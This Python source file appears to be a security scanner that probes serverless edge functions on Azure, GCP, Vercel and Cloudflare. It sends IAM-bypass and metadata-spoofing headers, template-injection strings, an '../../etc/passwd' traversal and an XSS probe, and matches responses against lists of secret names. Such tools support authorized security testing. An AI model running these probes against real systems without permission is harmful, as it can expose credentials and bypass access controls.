#!/usr/bin/env python3

"""Edge Functions Attack Testing — Serverless edge security probing.



Testa seguranca de edge functions:

  - Cloud Providers: azure_settings_leak, gcp_iam_bypass, vercel_secret_leak, kv_store_leak, edge_code_injection

"""

from __future__ import annotations

import argparse
import logging
import re
from collections.abc import Callable, Coroutine
from dataclasses import asdict, dataclass
from typing import Any
from urllib.parse import urlparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_banner,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.edgefunctions")

_BANNER_LINES: str = (
    "  _____ ____   _____           _   _  _      \n"
    " |_   _|  _ \\ / ____|         | \\ | || |     \n"
    "   | | | |_) | |  __  ___  __|  \\| || |___  \n"
    "   | | |  _ <| | |_ |/ _ \\/ _` . ` | / __| \n"
    "  _| |_| |_) | |__| |  __/ (_| |\\  || |__ \\ \n"
    " |_____|____/ \\_____|\\___|\\__,_| \\_/ |____/ \n"
)


_AZURE_SETTINGS_PATTERNS_DEFAULT: list[str] = [
    r"APPSETTING_",
    r"WEBSITE_",
    r"FUNCTIONS_WORKER_RUNTIME",
    r"AZURE_STORAGE",
    r"AZURE_SERVICE_BUS",
    r"AZURE_EVENT_HUB",
    r"AZURE_COSMOSDB",
    r"AZURE_SIGNALR",
    r"AZURE_KEY_VAULT",
    r"SQL_CONNECTION",
    r"REDIS_CONNECTION",
    r"WEBSITE_CONTENTAZUREFILECONNECTIONSTRING",
    r"WEBSITE_CONTENTSHARE",
    r"SCM_DO_BUILD_DURING_DEPLOYMENT",
    r"ENABLE_ORYX_BUILD_SERVICE",
    r"DOCKER_REGISTRY_SERVER",
    r"WEBSITES_ENABLE_APP_SERVICE_STORAGE",
    r"X-MS-EXECUTION-CONTEXT",
    r"X-Azure-Ref",
    r"x-ms-invocation-id",
    r"x-ms-workload-run-id",
    r"X-Functions-Key",
]


_GCP_IAM_BYPASS_PAYLOADS_DEFAULT: list[dict[str, Any]] = [
    {"headers": {}, "desc": "No auth"},
    {"headers": {"Authorization": "Bearer invalid_token"}, "desc": "Invalid token"},
    {"headers": {"Authorization": ""}, "desc": "Empty auth"},
    {
        "headers": {"X-Forwarded-For": "169.254.169.254"},
        "desc": "Metadata IP forwarded",
    },
    {"headers": {"X-Forwarded-For": "127.0.0.1"}, "desc": "Loopback forwarded"},
    {"headers": {"Host": "metadata.google.internal"}, "desc": "Metadata host spoof"},
    {"headers": {"X-Goog-Api-Key": "AIzaSyDummy"}, "desc": "Fake GCP API key"},
    {"headers": {"Metadata-Flavor": "Google"}, "desc": "GCP metadata header"},
    {
        "headers": {"X-Forwarded-Host": "metadata.google.internal"},
        "desc": "Metadata forwarded host",
    },
]


_VERCEL_SECRET_PATTERNS_DEFAULT: list[str] = [
    r"sk_live_",
    r"pk_live_",
    r"NEXTAUTH_SECRET",
    r"DATABASE_URL",
    r"POSTGRES_URL",
    r"MONGODB_URI",
    r"REDIS_URL",
    r"STRIPE_SECRET",
    r"TWILIO_",
    r"SENDGRID_",
    r"JWT_SECRET",
    r"SESSION_SECRET",
    r"ENCRYPTION_KEY",
    r"API_KEY",
    r"SECRET_KEY",
    r"ACCESS_TOKEN",
    r"REFRESH_TOKEN",
    r"PRIVATE_KEY",
    r"x-vercel-",
    r"X-Vercel-",
]


_KV_LEAK_PAYLOADS_DEFAULT: list[str] = [
    "keys",
    "KV_GET",
    "/kv",
    "/api/kv",
    "namespace",
    "KV_NAMESPACE",
    "../../kv",
    "%2e%2e/kv",
    "?key=debug",
    "?action=list",
    "?prefix=",
    "env",
    "ENV",
    "/api/env",
    "?_debug=1",
]


_EDGE_INJECTION_PAYLOADS_DEFAULT: list[dict[str, str]] = [
    {"header": "X-Forwarded-Host", "value": "evil.com"},
    {"header": "X-Real-IP", "value": "127.0.0.1"},
    {"header": "X-Forwarded-For", "value": "127.0.0.1"},
    {"header": "X-Original-URL", "value": "/admin"},
    {"header": "X-Rewrite-URL", "value": "/admin"},
    {"header": "Content-Type", "value": "application/x-www-form-urlencoded"},
    {"header": "X-Custom-Header", "value": "{{7*7}}"},
    {"header": "X-Edge-Function", "value": "debug"},
    {"header": "X-Request-ID", "value": "${7*7}"},
    {"header": "Accept", "value": "application/json, */*"},
]


_EDGE_ERROR_SIGNATURES_DEFAULT: list[str] = [
    "edge function",
    "edge runtime",
    "Vercel",
    "Cloudflare",
    "worker",
    "WORKER_",
    "addEventListener",
    "fetch handler",
    "error",
    "502",
    "503",
    "500",
    "internal server error",
    "function errored",
    "uncaught exception",
    "crypto",
    "TextEncoder",
    "Response",
    "Request",
    "URL",
    "Headers",
]


@dataclass(frozen=True, slots=True)
class EdgeFunctionAttempt:
    technique: str

    category: str

    description: str

    vulnerable: bool

    details: str

    error: str

    endpoint: str

    provider: str

    response_code: int

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class EdgeFunctionResult:
    target: str

    host: str

    port: int

    tls: bool

    endpoint: str

    provider_detected: str

    techniques_count: int

    attempts: list[EdgeFunctionAttempt]

    vulnerable_techniques: list[str]

    issues: list[str]

    overall_status: str


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "cloud_providers": [
        "azure_settings_leak",
        "gcp_iam_bypass",
        "vercel_secret_leak",
        "kv_store_leak",
        "edge_code_injection",
    ],
}


def _parse_url(target: str) -> tuple[str, str, int, bool]:

    if "://" not in target:
        target = "https://" + target

    parsed = urlparse(target)

    host = parsed.hostname or ""

    path = parsed.path or ""

    tls = parsed.scheme in ("https", "grpcs")

    default_port = 443 if tls else 80

    port = parsed.port or default_port

    return host, path, port, tls


def _detect_provider(headers: dict[str, str], body: str) -> str:

    combined = body + " ".join(f"{k}: {v}" for k, v in headers.items())

    lower = combined.lower()

    if any(
        sig.lower() in lower for sig in ("x-azure-", "azurewebsites", "functions.azure")
    ):
        return "azure"

    if any(
        sig.lower() in lower for sig in ("x-goog-", "google cloud", "cloudfunctions")
    ):
        return "gcp"

    if any(
        sig.lower() in lower for sig in ("x-vercel", "vercel", "now.sh", "vercel.app")
    ):
        return "vercel"

    if any(
        sig.lower() in lower
        for sig in ("cloudflare", "cf-ray", "cf-connecting-ip", "workers")
    ):
        return "cloudflare"

    if any(sig.lower() in lower for sig in ("amzn-", "lambda", "x-amz-")):
        return "aws"

    if any(sig.lower() in lower for sig in _EDGE_ERROR_SIGNATURES[:8]):
        return "edge_generic"

    return "unknown"


def _make_attempt(
    tech: str,
    cat: str,
    desc: str,
    vuln: bool,
    details: str,
    error: str,
    endpoint: str,
    provider: str,
    code: int,
) -> EdgeFunctionAttempt:

    return EdgeFunctionAttempt(
        technique=tech,
        category=cat,
        description=desc,
        vulnerable=vuln,
        details=details,
        error=error,
        exploit="function_abuse_payload" if vuln else "",
        tool="curl",
        endpoint=endpoint,
        provider=provider,
        response_code=code,
    )


def _extract_settings(body: str, patterns: list[str]) -> list[str]:

    found: list[str] = []

    for pat in patterns:
        matches = re.findall(pat, body, re.IGNORECASE)

        found.extend(matches)

    return list(set(found))


async def _test_azure_settings_leak(
    url: str,
    timeout: float,
    client: httpx.AsyncClient,
) -> EdgeFunctionAttempt:

    all_leaked: list[str] = []

    payloads = [
        {"body": b'{"body":"test"}', "headers": {}, "desc": "Basic invoke"},
        {"body": b'{"debug":true}', "headers": {}, "desc": "Debug mode"},
        {"body": b'{"function":"admin"}', "headers": {}, "desc": "Admin function"},
        {
            "body": b'{"status":"health"}',
            "headers": {"Accept": "application/json"},
            "desc": "Health check",
        },
        {
            "body": b"{}",
            "headers": {"X-MS-EXECUTION-CONTEXT": "test"},
            "desc": "Azure context header",
        },
        {
            "body": b'{"test":true}',
            "headers": {"X-Functions-Key": "admin"},
            "desc": "Functions key probe",
        },
    ]

    last_code = 0

    for payload in payloads:
        try:
            resp = await client.post(
                url, content=payload["body"], headers=payload["headers"]
            )

            last_code = resp.status_code

            resp_headers = {k.lower(): v for k, v in resp.headers.items()}

            leaked = _extract_settings(resp.text, _AZURE_SETTINGS_PATTERNS)

            all_leaked.extend(leaked)

            if resp_headers.get("x-ms-invocation-id"):
                all_leaked.append("x-ms-invocation-id")

            if resp_headers.get("x-functions-execution-id"):
                all_leaked.append("x-functions-execution-id")

        except Exception:
            pass

    unique = list(set(all_leaked))

    vuln = len(unique) > 0

    details = (
        f"Leaked: {', '.join(unique[:5])}" if vuln else "No Azure settings detected"
    )

    return _make_attempt(
        "azure_settings_leak",
        "cloud_providers",
        "Azure Function settings leak",
        vuln,
        details,
        "",
        url,
        "azure",
        last_code,
    )


async def _test_gcp_iam_bypass(
    url: str,
    timeout: float,
    client: httpx.AsyncClient,
) -> EdgeFunctionAttempt:

    bypass_results: list[str] = []

    for payload in _GCP_IAM_BYPASS_PAYLOADS:
        try:
            resp = await client.post(url, content=b"{}", headers=payload["headers"])

            resp_text = resp.text.lower()

            denied = (
                resp.status_code == 403
                or "permission denied" in resp_text
                or "unauthorized" in resp_text
                or "forbidden" in resp_text
            )

            if resp.status_code == 200 and resp.content.strip() and not denied:
                bypass_results.append(payload["desc"])

        except Exception:
            pass

    unique = list(set(bypass_results))

    vuln = len(unique) > 0

    details = f"Bypasses: {', '.join(unique[:5])}" if vuln else "All auth checks passed"

    return _make_attempt(
        "gcp_iam_bypass",
        "cloud_providers",
        "GCP Cloud Functions IAM bypass",
        vuln,
        details,
        "",
        url,
        "gcp",
        200,
    )


async def _test_vercel_secret_leak(
    url: str,
    timeout: float,
    client: httpx.AsyncClient,
) -> EdgeFunctionAttempt:

    all_leaked: list[str] = []

    payloads = [
        {"body": b'{"_debug":true}', "headers": {}, "desc": "Debug flag"},
        {"body": b'{"env":"all"}', "headers": {}, "desc": "Env request"},
        {"body": b'{"showConfig":true}', "headers": {}, "desc": "Config request"},
        {
            "body": b"{}",
            "headers": {"X-Vercel-Debug": "1"},
            "desc": "Vercel debug header",
        },
        {"body": b'{"middleware":"auth"}', "headers": {}, "desc": "Middleware probe"},
        {"body": b'{"action":"getConfig"}', "headers": {}, "desc": "getConfig action"},
    ]

    last_code = 0

    for payload in payloads:
        try:
            resp = await client.post(
                url, content=payload["body"], headers=payload["headers"]
            )

            last_code = resp.status_code

            leaked = _extract_settings(resp.text, _VERCEL_SECRET_PATTERNS)

            all_leaked.extend(leaked)

        except Exception:
            pass

    unique = list(set(all_leaked))

    vuln = len(unique) > 0

    details = (
        f"Leaked: {', '.join(unique[:5])}" if vuln else "No Vercel secrets detected"
    )

    return _make_attempt(
        "vercel_secret_leak",
        "cloud_providers",
        "Vercel edge function secret leak",
        vuln,
        details,
        "",
        url,
        "vercel",
        last_code,
    )


async def _test_kv_store_leak(
    url: str,
    timeout: float,
    client: httpx.AsyncClient,
) -> EdgeFunctionAttempt:

    leak_signals: list[str] = []

    for key in _KV_LEAK_PAYLOADS:
        try:
            resp = await client.get(f"{url}?action={key}")

            if resp.status_code == 200:
                leak_signals.append(f"action={key}")

            resp = await client.post(url, content=f'{{"key":"{key}"}}'.encode())

            if resp.status_code == 200 and key.lower() in resp.text.lower():
                leak_signals.append(f"key={key}")

        except Exception:
            pass

    try:
        resp = await client.get(f"{url}/../kv")

        if resp.status_code in (200, 403):
            leak_signals.append("path_traversal_kv")

    except Exception:
        pass

    unique = list(set(leak_signals))

    vuln = len(unique) > 0

    details = (
        f"KV signals: {', '.join(unique[:5])}" if vuln else "No KV store data leaked"
    )

    return _make_attempt(
        "kv_store_leak",
        "cloud_providers",
        "Cloudflare Workers KV data leak",
        vuln,
        details,
        "",
        url,
        "cloudflare",
        200,
    )


async def _test_edge_code_injection(
    url: str,
    timeout: float,
    client: httpx.AsyncClient,
) -> EdgeFunctionAttempt:

    injection_signals: list[str] = []

    for payload in _EDGE_INJECTION_PAYLOADS:
        try:
            resp = await client.post(
                url, content=b"{}", headers={payload["header"]: payload["value"]}
            )

            lower = resp.text.lower()

            if payload["value"] in resp.text:
                injection_signals.append(f"reflected:{payload['header']}")

            if "error" in lower and ("stack" in lower or "traceback" in lower):
                injection_signals.append(f"error_leak:{payload['header']}")

        except Exception:
            pass

    try:
        resp = await client.post(url, content=b'{"path":"../../etc/passwd"}')

        if "root:" in resp.text:
            injection_signals.append("path_traversal")

    except Exception:
        pass

    try:
        resp = await client.post(url, content=b'{"input":"<script>alert(1)</script>"}')

        if "<script>" in resp.text and resp.status_code == 200:
            injection_signals.append("xss_reflection")

    except Exception:
        pass

    unique = list(set(injection_signals))

    vuln = len(unique) > 0

    details = (
        f"Injection signals: {', '.join(unique[:5])}"
        if vuln
        else "No code injection detected"
    )

    return _make_attempt(
        "edge_code_injection",
        "cloud_providers",
        "Edge function code injection",
        vuln,
        details,
        "",
        url,
        "unknown",
        200,
    )


async def _test_cloud_providers(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    endpoint: str,
) -> list[EdgeFunctionAttempt]:

    results: list[EdgeFunctionAttempt] = []

    async with httpx.AsyncClient(
        timeout=timeout, verify=False, follow_redirects=True
    ) as client:
        for tech, fn in [
            ("azure_settings_leak", _test_azure_settings_leak),
            ("gcp_iam_bypass", _test_gcp_iam_bypass),
            ("vercel_secret_leak", _test_vercel_secret_leak),
            ("kv_store_leak", _test_kv_store_leak),
            ("edge_code_injection", _test_edge_code_injection),
        ]:
            try:
                result = await fn(endpoint, timeout, client)

                results.append(result)

            except Exception as exc:
                results.append(
                    _make_attempt(
                        tech,
                        "cloud_providers",
                        "",
                        False,
                        "",
                        str(exc)[:100],
                        endpoint,
                        "unknown",
                        0,
                    )
                )

    return results


def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "edgefunctions", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()


def _load_azure_settings_patterns() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "edgefunctions",
        default={"azure_settings_patterns": _AZURE_SETTINGS_PATTERNS_DEFAULT},
    )

    return data.get("azure_settings_patterns", _AZURE_SETTINGS_PATTERNS_DEFAULT)


_AZURE_SETTINGS_PATTERNS = _load_azure_settings_patterns()


def _load_gcp_iam_bypass_payloads() -> list[dict[str, Any]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "edgefunctions",
        default={"gcp_iam_bypass_payloads": _GCP_IAM_BYPASS_PAYLOADS_DEFAULT},
    )

    return data.get("gcp_iam_bypass_payloads", _GCP_IAM_BYPASS_PAYLOADS_DEFAULT)


_GCP_IAM_BYPASS_PAYLOADS = _load_gcp_iam_bypass_payloads()


def _load_vercel_secret_patterns() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "edgefunctions",
        default={"vercel_secret_patterns": _VERCEL_SECRET_PATTERNS_DEFAULT},
    )

    return data.get("vercel_secret_patterns", _VERCEL_SECRET_PATTERNS_DEFAULT)


_VERCEL_SECRET_PATTERNS = _load_vercel_secret_patterns()


def _load_kv_leak_payloads() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "edgefunctions", default={"kv_leak_payloads": _KV_LEAK_PAYLOADS_DEFAULT}
    )

    return data.get("kv_leak_payloads", _KV_LEAK_PAYLOADS_DEFAULT)


_KV_LEAK_PAYLOADS = _load_kv_leak_payloads()


def _load_edge_injection_payloads() -> list[dict[str, str]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "edgefunctions",
        default={"edge_injection_payloads": _EDGE_INJECTION_PAYLOADS_DEFAULT},
    )

    return data.get("edge_injection_payloads", _EDGE_INJECTION_PAYLOADS_DEFAULT)


_EDGE_INJECTION_PAYLOADS = _load_edge_injection_payloads()


def _load_edge_error_signatures() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "edgefunctions",
        default={"edge_error_signatures": _EDGE_ERROR_SIGNATURES_DEFAULT},
    )

    return data.get("edge_error_signatures", _EDGE_ERROR_SIGNATURES_DEFAULT)


_EDGE_ERROR_SIGNATURES = _load_edge_error_signatures()


_CATEGORY_DISPATCH: dict[
    str, Callable[..., Coroutine[Any, Any, list[EdgeFunctionAttempt]]]
] = {
    "cloud_providers": _test_cloud_providers,
}


def print_results(result: EdgeFunctionResult) -> None:

    print()

    print(color("[*]", Cyber.CYAN, Cyber.BOLD), "Edge Functions Attack Testing")

    print(color("[*]", Cyber.CYAN), f"Target: {result.target}")

    print(
        color("[*]", Cyber.CYAN),
        f"Host: {result.host}:{result.port} (TLS: {result.tls})",
    )

    print(color("[*]", Cyber.CYAN), f"Endpoint: {result.endpoint}")

    print(color("[*]", Cyber.CYAN), f"Provider: {result.provider_detected}")

    print(color("[*]", Cyber.CYAN), f"Techniques: {result.techniques_count}")

    print()

    if result.issues:
        print(color("[!]", Cyber.YELLOW, Cyber.BOLD), "Issues:")

        for issue in result.issues:
            print(color("    -", Cyber.YELLOW), issue)

        print()

    categories: dict[str, list[EdgeFunctionAttempt]] = {}

    for attempt in result.attempts:
        categories.setdefault(attempt.category, []).append(attempt)

    for cat, attempts in categories.items():
        vuln_in_cat = [a for a in attempts if a.vulnerable]

        if vuln_in_cat:
            print(
                color("[!]", Cyber.RED, Cyber.BOLD),
                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
            )

            for a in vuln_in_cat:
                print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")

                print_exploit_info(a.exploit, a.tool)

        else:
            print(color("[+]", Cyber.GREEN), f"{cat}: secure")

    print()

    if result.overall_status == "vulnerable":
        print(
            color("[!]", Cyber.RED, Cyber.BOLD),
            "VULNERABLE — Edge function weaknesses detected!",
        )

    else:
        print(
            color("[+]", Cyber.GREEN, Cyber.BOLD),
            "SECURE — Edge function configuration looks good",
        )

    print()


async def run_scan(
    target: str,
    categories: list[str] | None,
    timeout: float,
    output_file: str | None,
) -> EdgeFunctionResult:

    host, path, port, tls = _parse_url(target)

    scheme = "https" if tls else "http"

    endpoint = (
        f"{scheme}://{host}:{port}" if port not in (80, 443) else f"{scheme}://{host}"
    )

    if path:
        endpoint = endpoint.rstrip("/") + path

    provider_detected = "unknown"

    all_attempts: list[EdgeFunctionAttempt] = []

    cats = categories if categories is not None else list(_CATEGORY_MAP.keys())

    for cat in cats:
        tester = _CATEGORY_DISPATCH.get(cat)

        if tester is None:
            continue

        try:
            raw = await tester(host, port, path, timeout, tls, endpoint)

            all_attempts.extend(raw)

            providers = [a.provider for a in raw if a.provider != "unknown"]

            if providers:
                provider_detected = max(set(providers), key=providers.count)

        except Exception as e:
            all_attempts.append(
                _make_attempt(
                    f"{cat}_error",
                    cat,
                    "",
                    False,
                    "",
                    str(e)[:100],
                    endpoint,
                    "unknown",
                    0,
                )
            )

    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]

    issue_techs = [a.technique for a in all_attempts if a.error and not a.vulnerable]

    issues = [f"Errors: {', '.join(issue_techs)}"] if issue_techs else []

    overall = "vulnerable" if vuln_techs else "secure"

    result = EdgeFunctionResult(
        target=target,
        host=host,
        port=port,
        tls=tls,
        endpoint=endpoint,
        provider_detected=provider_detected,
        techniques_count=len(all_attempts),
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, [asdict(a) for a in all_attempts])

    return result


def build_parser() -> argparse.ArgumentParser:

    parser = argparse.ArgumentParser(
        prog="mytools-edge",
        description="Edge Functions Attack Testing — Azure, GCP, Vercel, Cloudflare edge security",
    )

    parser.add_argument("url", help="URL alvo (https://target.com/api/endpoint)")

    parser.add_argument(
        "-c",
        "--categories",
        nargs="+",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categorias para testar",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:

    result = safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=getattr(args, "categories", None),
            timeout=getattr(args, "timeout", 5.0),
            output_file=getattr(args, "output", None),
        )
    )

    return 1 if result.overall_status == "vulnerable" else 0


def main() -> int:

    return run_main_loop(
        parser=build_parser(),
        banner_fn=create_banner(_BANNER_LINES, "Edge Functions Attack Testing"),
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="edge> ",
        description="Edge Functions Attack Testing — Azure, GCP, Vercel, Cloudflare edge security",
        example="mytools-edge https://target.com/api/endpoint",
        contextual_help="cloud_providers: azure_settings_leak, gcp_iam_bypass, vercel_secret_leak, kv_store_leak, edge_code_injection",
    )


if __name__ == "__main__":
    raise SystemExit(main())
